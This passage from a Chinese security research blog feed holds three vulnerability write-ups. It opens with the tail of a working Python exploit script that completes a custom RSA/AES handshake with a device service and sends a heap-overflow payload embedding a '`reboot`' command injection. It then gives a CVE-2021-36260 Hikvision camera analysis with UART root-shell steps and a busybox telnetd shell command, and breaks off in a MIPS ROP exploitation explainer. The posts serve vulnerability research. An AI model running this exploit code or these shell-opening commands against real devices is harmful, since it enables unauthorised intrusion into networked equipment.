class="number">0x37D83BF0</span>,</span><br><span class="line"><span class="number">0xA9BCAE53</span>, <span class="number">0xDEBB9EC5</span>, <span class="number">0x47B2CF7F</span>, <span class="number">0x30B5FFE9</span>,</span><br><span class="line"><span class="number">0xBDBDF21C</span>, <span class="number">0xCABAC28A</span>, <span class="number">0x53B39330</span>, <span class="number">0x24B4A3A6</span>,</span><br><span class="line"><span class="number">0xBAD03605</span>, <span class="number">0xCDD70693</span>, <span class="number">0x54DE5729</span>, <span class="number">0x23D967BF</span>,</span><br><span class="line"><span class="number">0xB3667A2E</span>, <span class="number">0xC4614AB8</span>, <span class="number">0x5D681B02</span>, <span class="number">0x2A6F2B94</span>,</span><br><span class="line"><span class="number">0xB40BBE37</span>, <span class="number">0xC30C8EA1</span>, <span class="number">0x5A05DF1B</span>, <span class="number">0x2D02EF8D</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crc32</span>(<span class="params">binaries</span>):</span><br><span class="line">    crc = <span class="number">0</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> index &lt; <span class="built_in">len</span>(binaries):</span><br><span class="line">        crc = crc32_table[(crc &amp; <span class="number">0xFF</span>) ^ binaries[index]] ^ (crc//<span class="number">256</span>)</span><br><span class="line">        index = index + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> crc</span><br><span class="line"></span><br><span class="line">context.endian = <span class="string">&quot;big&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line"><span class="comment"># ---- udp heap overflow poc ----</span></span><br><span class="line"><span class="comment"># opcode = 1</span></span><br><span class="line"><span class="comment"># unknow2 = 0xffffffff</span></span><br><span class="line"><span class="comment"># unknow3 = 0xffffffff</span></span><br><span class="line"><span class="comment"># padding = b&quot;\x61&quot; * (0x7ff - 12)</span></span><br><span class="line"><span class="comment"># payload = p32(opcode) + p32(unknow2) + p32(unknow3) + padding</span></span><br><span class="line"><span class="comment"># print(len(payload))</span></span><br><span class="line"><span class="comment"># p = remote(&quot;192.168.50.1&quot;, 7788, typ=&quot;udp&quot;)</span></span><br><span class="line"><span class="comment"># p.send(payload)</span></span><br><span class="line"><span class="comment"># p.close()</span></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;192.168.50.1&quot;</span>, <span class="number">7788</span>)   <span class="comment"># connect to server</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- cm_processREQ_KU ----</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Get public key...&quot;</span>)</span><br><span class="line">opcode = <span class="number">0x1</span></span><br><span class="line">tlv_len = <span class="number">0x1</span></span><br><span class="line">tlv_crc = <span class="number">0x0</span></span><br><span class="line">tlv = <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">REQ_NC = p32(opcode) + p32(tlv_len) + p32(tlv_crc) + tlv    <span class="comment"># request for public key</span></span><br><span class="line">p.send(REQ_NC)</span><br><span class="line">p.recv(<span class="number">12</span>)    <span class="comment"># skip header</span></span><br><span class="line">public_key = p.recv()[:-<span class="number">1</span>].decode()</span><br><span class="line"><span class="built_in">print</span>(public_key)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./public.rsa&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">f.write(public_key)</span><br><span class="line">f.close()</span><br><span class="line">p.close()</span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- cm_processACK_GROUPID ----</span></span><br><span class="line">p = remote(<span class="string">&quot;192.168.50.1&quot;</span>, <span class="number">7788</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encode</span>(<span class="params">data, key</span>):</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> aes.encrypt(data)</span><br><span class="line"></span><br><span class="line">_rop = aes_encode(<span class="string">b&quot;\x61&quot;</span> * <span class="number">0x10</span>, <span class="string">b&quot;12345678000000000000000000000000&quot;</span>)</span><br><span class="line">opcode = <span class="number">0x2a</span></span><br><span class="line">payload = p32(opcode) + p32(<span class="number">0x10</span>) + p32(<span class="number">0</span>) + _rop</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line">p.close()</span><br><span class="line"><span class="comment"># -------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- create tlv data ----</span></span><br><span class="line">banner1 = <span class="number">0x1</span></span><br><span class="line">data1_len = <span class="number">32</span>    <span class="comment"># aes256</span></span><br><span class="line">aes_key = <span class="string">b&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span></span><br><span class="line">aes_crc = crc32(aes_key) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">banner2 = <span class="number">0x3</span></span><br><span class="line">data2_len = <span class="number">0x8</span></span><br><span class="line">data2 = <span class="string">b&quot;b&quot;</span> * <span class="number">0x8</span></span><br><span class="line">data2_crc = crc32(data2) &amp; <span class="number">0xffffffff</span></span><br><span class="line">tlv = p32(banner1) + p32(data1_len) + p32(aes_crc) + aes_key + p32(banner2) + p32(data2_len) + p32(data2_crc) + data2</span><br><span class="line"><span class="comment"># -------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- rsa encrypt ----</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./public.rsa&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = f.read()</span><br><span class="line">    pubobj = rsa.importKey(key)</span><br><span class="line">    pubobj = PKCS1_v1_5.new(pubobj)</span><br><span class="line">    enc_text = pubobj.encrypt(tlv)</span><br><span class="line"><span class="comment"># ---------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- create payload data ----</span></span><br><span class="line">tlv_len = <span class="built_in">len</span>(enc_text)</span><br><span class="line">tlv_crc = crc32(enc_text)</span><br><span class="line">payload = p32(tlv_len) + p32(tlv_crc) + enc_text</span><br><span class="line"><span class="comment"># -----------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- cm_processREQ_NC ----</span></span><br><span class="line">opcode = <span class="number">0x3</span></span><br><span class="line">data = p32(opcode) + payload</span><br><span class="line">p = remote(<span class="string">&quot;192.168.50.1&quot;</span>, <span class="number">7788</span>)</span><br><span class="line">p.send(data)</span><br><span class="line">p.recv(<span class="number">12</span>)    <span class="comment"># skip header</span></span><br><span class="line">aes_enc_data = p.recv()</span><br><span class="line"><span class="comment"># p.close()</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- aes decrypt ----</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decode</span>(<span class="params">data, key</span>):</span><br><span class="line">    aes = AES.new(<span class="built_in">str</span>.encode(key), AES.MODE_ECB)</span><br><span class="line">    decrypted_text = aes.decrypt(data)</span><br><span class="line">    <span class="keyword">return</span> decrypted_text</span><br><span class="line"></span><br><span class="line">server_nonce_data2 = aes_decode(aes_enc_data, <span class="string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">server_nonce = server_nonce_data2[<span class="number">12</span>:<span class="number">12</span> + <span class="number">32</span>]</span><br><span class="line">custom_data = <span class="string">b&quot;bbbbbbbb&quot;</span></span><br><span class="line">_<span class="built_in">hash</span> = hashlib.sha256()</span><br><span class="line">_<span class="built_in">hash</span>.update(<span class="string">b&quot;A22AAC3EB69F9943ED8929D810A077A3&quot;</span> + server_nonce + custom_data)</span><br><span class="line">session_key = _<span class="built_in">hash</span>.hexdigest()</span><br><span class="line"><span class="built_in">print</span>(session_key)</span><br><span class="line"><span class="comment"># ---------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- cm_processREP_OK ----</span></span><br><span class="line">opcode = <span class="number">0x5</span></span><br><span class="line">payload = p32(opcode) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>)</span><br><span class="line">p.send(payload)    <span class="comment"># if server return 0x6000000, means success.</span></span><br><span class="line">res = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">if</span> res != <span class="number">6</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Error: handshake failed.&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Handshake successed.&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ----cm_processREQ_JOIN ----</span></span><br><span class="line"><span class="comment"># def aes_encode(data, key):</span></span><br><span class="line"><span class="comment">#     aes = AES.new(key, AES.MODE_ECB)</span></span><br><span class="line"><span class="comment">#     return aes.encrypt(data)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode = 0xf</span></span><br><span class="line"><span class="comment"># _payload = b&quot;a&quot; * 0x100</span></span><br><span class="line"><span class="comment"># _rop = aes_encode(_payload, bytes.fromhex(session_key))</span></span><br><span class="line"><span class="comment"># payload = p32(opcode) + p32(0xffffffff) + p32(0) + _rop</span></span><br><span class="line"><span class="comment"># p.send(payload)</span></span><br><span class="line"><span class="comment"># print(p.recv())</span></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># path2</span></span><br><span class="line"><span class="comment"># ---- cm_processACK_GROUPID ----</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encode</span>(<span class="params">data, key</span>):</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> aes.encrypt(data)</span><br><span class="line"></span><br><span class="line">_payload = <span class="string">b&quot;\x00&quot;</span> * (<span class="number">0x1c</span>) + <span class="string">b&#x27;\xd4\x43\x01\x00&#x27;</span> +  <span class="string">b&quot;\x61&quot;</span> * (<span class="number">0x30</span> - <span class="number">0x20</span>) + <span class="string">b&quot;xxxx&quot;</span> + <span class="string">b&quot;`reboot`aaaa&quot;</span></span><br><span class="line">_rop = aes_encode(_payload, <span class="string">b&quot;12345678000000000000000000000000&quot;</span>)</span><br><span class="line">opcode = <span class="number">0x2a</span></span><br><span class="line">payload = p32(opcode) + p32(<span class="number">0xffffffff</span>) + p32(<span class="number">0</span>) + _rop    <span class="comment"># malloc 0x4</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="comment"># -------------------------------</span></span><br></pre></td></tr></table></figure></div>

<p>PS：cm_processACK_GROUPID 功能中的 AES 解密密钥从 get_onboarding_key 函数而来，可通过调试获取。</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>此服务所在程序只能从内网访问，所以危害有限。</p>
<p>利用此漏洞需要一些特殊的内存布局，感兴趣的读者可自行尝试其它更稳定的利用手段。</p>
<p>如文章有误敬请指正，欢迎来信讨论。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2021-36260</title>
    <url>/2021/10/18/CVE-2021-36260/</url>
    <content><![CDATA[<p>2021 年 09 月 18 日, <a class="link"   href="https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html" >一篇博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>公开了一个影响海康威视 IPC&#x2F;NVR 多个型号设备的未授权代码执行安全风险，编号为 CVE-2021-36260，本文此漏洞进行复现分析。</p>
<span id="more"></span>

<h2 id="获取固件"><a href="#获取固件" class="headerlink" title="获取固件"></a>获取固件</h2><p>根据披露信息，去海康威视欧洲区域网站下载设备固件，由于此漏洞影响不同型号设备，我们选择 DS-2CD1x10 系列进行测试，<a class="link"   href="https://www.hikvisioneurope.com/eu/portal/portal/Technical%20Materials/00%20%20Network%20Camera/00%20%20Product%20Firmware/R2%20platform%20%28DS-2CD1x10%2C1X02%2C1X21%2C2xx0%2C2X14%2C4xx0%2C%20mobile%20IPC%29/V5.4.81_Build180203%28Released%29except%20mobile%20IPC/IPC_R2_EN_STD_V5.4.81_Build180203.zip" >点此下载固件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<p>拿到固件后 binwalk 直接解包，得到一个 linux rootfs，以及一个 cramfs 分区数据。(PS：某些版本的公开固件可能是加密的，需要读取 flash 芯片数据)</p>
<p>尽管能够成功解开固件，但是在解包的文件系统中没有找到类似 httpd 等关键程序。在 cramfs 分区中存在一些可执行文件，其中一个叫做 davinci_bak 的文件既不是可执行程序，也不是配置文件，且通过 binwalk 查看熵值发现文件似乎经过加密。</p>
<p>搜索 davinci_bak 在 daemon_fsp_app 文件中找到相关信息，此程序从 &#x2F;dev&#x2F;hikio 设备文件中读取密钥，然后利用 OpenSSL 对 davinci_bak 进行 AES 解密，猜测此文件内包含主要逻辑。</p>
<h2 id="串口调试"><a href="#串口调试" class="headerlink" title="串口调试"></a>串口调试</h2><p>从本地固件中无法得到 AES 密钥信息，所以我们要尝试从真机上提取主程序。</p>
<p>拆解机器，在主板上找到了预留的 UART 调试接口，焊接处理之后即可使用 FT232 调试。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2021-36260-1.jpg"
                     
                ></p>
<p>接好线路将串口工具接入电脑，设置波特率为 115200，上电开机看到串口有数据输出。</p>
<p>等待系统正常启动，发现输出了命令提示符，但是许多 linux 命令都无法使用，ps 看到目前我们操作的是 &#x2F;bin&#x2F;psh 程序，此程序为海康威视编写的 protect-shell，禁用了大部分系统功能。</p>
<h2 id="获取-root-shell"><a href="#获取-root-shell" class="headerlink" title="获取 root shell"></a>获取 root shell</h2><p>为了方便后续的操作，我们需要获取完整的 shell，通过在网络上检索信息，找到 ipcamtalk 论坛<a class="link"   href="https://ipcamtalk.com/threads/long-shot-help-request-hikvision-ds-2cd3335d-g0-series-ipc.21775/page-2" >一篇帖子<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，其中提到了可以通过修改 u-boot 启动参数的方式来获取完整 shell。</p>
<p>重启设备，当串口提示 “Hit Ctrl+u to stop autoboot:” 时按下 Ctrl + u 进入 u-boot 命令行，输入 help 看到帮助信息。</p>
<p>用 “setenv bootargs console&#x3D;ttyS0,115200 root&#x3D;&#x2F;dev&#x2F;ram0 mem&#x3D;61M dbg&#x3D;9 debug single” 命令来修改 bootargs 环境变量，“saveenv” 保存修改，“reset” 重启设备，等待设备启动后即可得到完整的 shell。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2021-36260-2.png"
                     
                ></p>
<p>不过由于我们修改了启动进程，导致目前系统还未初始化，其中的关键程序没有启动，可以执行以下命令序列完成设备初始化并保留 root shell。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm /bin/psh</span><br><span class="line">echo &quot;#!/bin/bash&quot; &gt; /bin/psh</span><br><span class="line">echo &quot;/bin/bash&quot; &gt;&gt; /bin/psh</span><br><span class="line">chmod +x /bin/psh    # 将 psh 替换为完整的 bash</span><br><span class="line">./linuxrc    # 执行系统初始化脚本</span><br></pre></td></tr></table></figure></div>

<h2 id="挂载-nfs"><a href="#挂载-nfs" class="headerlink" title="挂载 nfs"></a>挂载 nfs</h2><p>设备自带的 busybox 经过大幅度裁剪，缺少 curl、wget 等向设备传输文件的功能，导致后续测试困难。我们考虑用 nfs 实现文件传输，在摄像头上利用 mount 命令挂载外部设备的 nfs 文件系统到本地。</p>
<p>首先准备一份完整的 <a class="link"   href="https://busybox.net/downloads/binaries/1.19.0/" >busybox<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，在本地开启一个 nfs 服务器，设备上执行以下命令</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /tmp/hik</span><br><span class="line">busybox mount -o nolock -t nfs 192.168.0.160:/home/iot/Desktop/hik /tmp/hik</span><br><span class="line">chmod 777 /tmp/hik/busybox-armv5l</span><br><span class="line">/tmp/hik/busybox-armv5l telnetd -l/bin/sh -p31337 &amp;</span><br></pre></td></tr></table></figure></div>

<p>执行后即可连接设备 31337 端口得到 shell，防止串口输出的其它信息干扰分析。</p>
<h2 id="补丁对比"><a href="#补丁对比" class="headerlink" title="补丁对比"></a>补丁对比</h2><p>在 &#x2F;home&#x2F;process 目录下找到解密完成的 davinci 程序，将它拷贝回 nfs 目录</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /home/process/davinci /tmp/hik</span><br></pre></td></tr></table></figure></div>

<p>这样在 nfs 服务器端就能下载到此程序。</p>
<p>同样的操作我们解包出修复前和修复后的两个 davinci 程序，用 bindiff 进行补丁对比，得到的结果中涉及一个叫做 hwif_is_all_language_character_legal 的函数，两个版本函数如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// OLD Version</span></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">hwif_is_all_language_character_legal</span><span class="params">(<span class="type">char</span> *filename, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> v3; <span class="comment">// r4</span></span><br><span class="line">    <span class="type">size_t</span> filename_len; <span class="comment">// r0</span></span><br><span class="line">    <span class="type">size_t</span> v5; <span class="comment">// r5</span></span><br><span class="line">    <span class="type">char</span> *v6; <span class="comment">// r0</span></span><br><span class="line">    <span class="type">char</span> *filtered_filename; <span class="comment">// r6</span></span><br><span class="line">    <span class="type">char</span> *tmp_buf; <span class="comment">// r2</span></span><br><span class="line">    <span class="type">size_t</span> i; <span class="comment">// r3</span></span><br><span class="line">    <span class="type">int</span> v10; <span class="comment">// r1</span></span><br><span class="line">    <span class="type">char</span> v11; <span class="comment">// r0</span></span><br><span class="line">    <span class="type">bool</span> v12; <span class="comment">// zf</span></span><br><span class="line">    <span class="type">size_t</span> v13; <span class="comment">// r0</span></span><br><span class="line">    <span class="type">size_t</span> v14; <span class="comment">// r2</span></span><br><span class="line"></span><br><span class="line">    v3 = a2;</span><br><span class="line">    <span class="keyword">if</span> ( !filename )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">    <span class="keyword">if</span> ( !a2 )</span><br><span class="line">    &#123;</span><br><span class="line">        dev_debug_v1(<span class="number">2</span>, <span class="number">48</span>, <span class="string">&quot;basefun_lib/string/string_deal.c&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> v3;</span><br><span class="line">    &#125;</span><br><span class="line">    filename_len = <span class="built_in">strlen</span>(filename);</span><br><span class="line">    v5 = filename_len;</span><br><span class="line">    <span class="keyword">if</span> ( filename_len != v3 || (v6 = <span class="built_in">calloc</span>(<span class="number">1u</span>, filename_len + <span class="number">1</span>), (filtered_filename = v6) == <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        LABEL_5:</span><br><span class="line">        dev_debug_v1(<span class="number">2</span>, <span class="number">48</span>, <span class="string">&quot;basefun_lib/string/string_deal.c&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tmp_buf = v6;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        v10 = filename[i];</span><br><span class="line">        v11 = filename[i];</span><br><span class="line">        v12 = v10 == <span class="string">&#x27;`&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v10 != <span class="string">&#x27;`&#x27;</span> )</span><br><span class="line">            v12 = v10 == <span class="string">&#x27;;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v12 )</span><br><span class="line">            *tmp_buf++ = v11;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    *tmp_buf = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(filename, <span class="number">0</span>, v5);</span><br><span class="line">    v13 = <span class="built_in">strlen</span>(filtered_filename);</span><br><span class="line">    <span class="keyword">if</span> ( v13 &gt;= v5 )</span><br><span class="line">        v14 = v5;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        v14 = v13;</span><br><span class="line">    <span class="built_in">memcpy</span>(filename, filtered_filename, v14);</span><br><span class="line">    <span class="built_in">free</span>(filtered_filename);</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// NEW Version</span></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">hwif_is_all_language_character_legal</span><span class="params">(<span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// r3</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 v3; <span class="comment">// r12</span></span><br><span class="line">    <span class="type">bool</span> v4; <span class="comment">// cc</span></span><br><span class="line">    <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( a1 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 = *(a1 + i);</span><br><span class="line">            v4 = v3 - <span class="number">48</span> &gt; <span class="number">9</span>;</span><br><span class="line">            <span class="keyword">if</span> ( v3 - <span class="number">48</span> &gt; <span class="number">9</span> )</span><br><span class="line">                v4 = v3 - <span class="number">97</span> &gt; <span class="number">25</span>;</span><br><span class="line">            <span class="keyword">if</span> ( v4 &amp;&amp; v3 - <span class="number">65</span> &gt; <span class="number">25</span> &amp;&amp; v3 != <span class="number">45</span> &amp;&amp; v3 != <span class="number">95</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">        &#125;</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        dev_debug_v1(</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">38</span>,</span><br><span class="line">            <span class="string">&quot;hardwareif/r2/unihardwareif.c&quot;</span>,</span><br><span class="line">            <span class="number">402</span>,</span><br><span class="line">            <span class="string">&quot;hwif_is_all_language_character_legal&quot;</span>,</span><br><span class="line">            <span class="string">&quot;p_str is NULL.\n&quot;</span>);</span><br><span class="line">        LABEL_11:</span><br><span class="line">        result = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>旧版本只检查了字符串中是否包含 &#96;;，而新版中限制字符串是纯数字&#x2F;字母组成。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>通过交叉引用 hwif_is_all_language_character_legal 函数定位到漏洞的具体位置</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> ( hwif_is_all_language_character_legal(a1, v3) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_13;</span><br><span class="line"><span class="built_in">snprintf</span>(s, <span class="number">0x1F</span>u, <span class="string">&quot;%s%s&quot;</span>, <span class="string">&quot;/home/webLib/doc/i18n/&quot;</span>, a1);</span><br><span class="line"><span class="keyword">if</span> ( !check_is_file_exist(s) )</span><br><span class="line">&#123;</span><br><span class="line">    dev_debug_v1(<span class="number">5</span>, <span class="number">38</span>, <span class="string">&quot;hardwareif/r2/unihardwareif.c&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line"><span class="built_in">snprintf</span>(s, <span class="number">0x1F</span>u, <span class="string">&quot;/dav/IElang.tar %s.tar.gz&quot;</span>, a1);</span><br><span class="line"><span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line"><span class="built_in">snprintf</span>(</span><br><span class="line">    v5,</span><br><span class="line">    <span class="number">0xFF</span>u,</span><br><span class="line">    <span class="string">&quot;tar -xf %s -C %s; tar -zxf %s%s.tar.gz -C %s&quot;</span>,</span><br><span class="line">    s,</span><br><span class="line">    <span class="string">&quot;/home/webLib/doc/i18n/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/home/webLib/doc/i18n/&quot;</span>,</span><br><span class="line">    a1,</span><br><span class="line">    <span class="string">&quot;/home/webLib/doc/i18n/&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( system(v5) &lt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></div>

<p>我们可以看到参数 a1 经过 hwif_is_all_language_character_legal 过滤之后会将其作为文件名检查目标文件是否存在，如果不存在则将 a1 拼接到 tar 命令中直接带入 system 函数执行，显然存在命令注入。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>MIPS ROP-system parameter issue</title>
    <url>/2021/09/17/mipsrop/</url>
    <content><![CDATA[<p>MIPS 架构下的栈溢出安全缺陷 exploit - system 函数参数覆盖问题。</p>
<span id="more"></span>

<h2 id="常见的-MIPS-下安全缺陷利用方式"><a href="#常见的-MIPS-下安全缺陷利用方式" class="headerlink" title="常见的 MIPS 下安全缺陷利用方式"></a>常见的 MIPS 下安全缺陷利用方式</h2><p>MIPS 架构下的栈溢出 exploit 通常会使用 ret2shellcode、ret2text、ret2libc 三种方式。</p>
<p><strong>ret2shellcode</strong></p>
<p>MIPS 指令集中存在一类特殊的 gadget，它们可以通过 $sp 寄存器寻址，将栈地址($sp + offset)加载到某寄存器中，然后跳转到该寄存器执行。另外，MIPS 架构下仅有受限的 no-execute 保护[1]，根据 MIPS 官方文档[2]描述，只有在 MIPS Release 3 以及 SmartMIPS ASE 中包含类似 no-execute 的 XI(Execute Inhibit) 保护，而大量采用 MIPS CPU 的设备中，stack 内存区域通常包含 rwx 权限。</p>
<p>基于以上两点，我们可以将 shellcode 布置于 stack，然后利用此类 gadget 跳转到 shellcode 执行。</p>
<p><strong>ret2text</strong></p>
<p>某些情况下包含安全缺陷的目标程序中含有比较有用的代码片段，例如程序中包含调用 system 函数的逻辑，此时可通过 ret2text 返回到程序内部的 system 函数执行命令。</p>
<p><strong>ret2libc</strong></p>
<p>以上两种方式基本都需要多次控制程序执行流程，然而在实际情况下，很多包含安全缺陷的程序对于用户提交的数据有限制，例如 \x00 在 web 服务中会截断其后的数据，导致请求不完整。此类情况下会考虑将程序执行流劫持到 libc 中，因为 libc 地址较高，不会包含 \x00 等坏字节。ret2libc 的一种经典思路是将命令保存到 stack，然后通过 ROP 将 stack 地址加载至 $a0 寄存器，最后跳转到 libc 中的 system 函数执行命令。</p>
<p>以上是 MIPS 架构中比较常用的安全缺陷利用方式，最终达到执行系统命令的目的(详细思路可参考互联网文章)。</p>
<h2 id="system-参数覆盖问题"><a href="#system-参数覆盖问题" class="headerlink" title="system 参数覆盖问题"></a>system 参数覆盖问题</h2><p>下面简单说明什么是 system 参数覆盖以及这个问题是如何出现的。</p>
<p>假设一网络设备的 web 服务中包含一个栈溢出安全缺陷，当用户发送的请求中 URI 部分过长，会导致程序向栈缓冲区拷贝过多的数据，使程序崩溃。</p>
<p>按照经典的 exploit 思路，这里可以采用 ret2libc 方式，先用 mipsrop 工具从 libc 中查找合适的 gadget</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">|  0x000518D0  |  addiu $a0,$sp,24 ; jr    68($sp)</span><br></pre></td></tr></table></figure></div>

<p>我们看到位于 0x518D0 位置的 gadget 比较合适，它将 $sp + 24 地址加载到 $a0，然后跳转到 $sp + 68 指向的地址继续执行。</p>
<p>所以可进行如下内存布局：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/mipsrop-1.png"
                     
                ></p>
<p>padding 部分填充栈空间数据，gadget_address(libc_address + 0x000518D0)覆盖了返回地址，当程序从包含安全缺陷的函数返回时，由于此函数为非叶子函数，所以会从栈上获取返回地址加载到 $ra，而返回地址已经被我们修改为 gadget，所以程序跳转到 gadget 继续执行。</p>
<p>这段 gadget 具体的汇编代码序列如下</p>
